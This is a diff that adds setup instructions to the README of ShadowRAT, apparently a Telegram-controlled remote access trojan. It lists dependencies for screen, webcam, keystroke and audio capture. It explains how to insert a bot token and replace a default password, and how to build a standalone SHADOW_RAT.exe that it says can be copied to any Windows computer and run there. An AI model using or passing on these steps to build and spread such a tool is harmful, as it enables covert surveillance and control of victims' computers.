@@ -228,3 +228,58 @@ git clone https://github.com/s-r-e-e-r-a-j/ShadowRAT.git
 ```bash
 cd ShadowRAT
 ```
+### Install Required Packages
+Copy and paste this command in Command Prompt:
+
+```bash
+pip install pyautogui opencv-python pyttsx3 numpy pynput requests pytelegrambotapi pillow wave pyaudio 
+```
+
+If PyAudio gives an error, try these commands instead:
+
+```bash
+pip install pipwin
+pipwin install pyaudio
+```
+
+### Set Up Your Bot Token
+1. Open `shadow_rat.py` with Notepad or any text editor
+
+2. Find this line:
+
+```python
+BOT_TOKEN: str = 'YOUR_BOT_TOKEN_HERE'
+```
+
+3. Replace `YOUR_BOT_TOKEN_HERE` with the token you got from BotFather
+
+4. Save the file
+
+### Change Password (Optional but Recommended)
+1. In the same file, find this line:
+
+```python
+PASSWORD: str = '1234567B'
+```
+2. Change `1234567B` to your own secret password.
+
+### Run the Tool (Two Ways)
+
+**Way 1 - Run as Python Script:**
+```bash
+python shadow_rat.py
+```
+**Way 2 - Build as EXE File (No Python Needed):**
+
+*First, install PyInstaller:*
+```bash
+pip install pyinstaller
+```
+*Then run the builder script:*
+
+```bash
+python build_rat.py
+```
+Select option `3` (Full rebuild). The EXE file will be in the `dist` folder as `SHADOW_RAT.exe`.
+
+You can copy this single EXE file to any Windows computer and run it without installing Python.
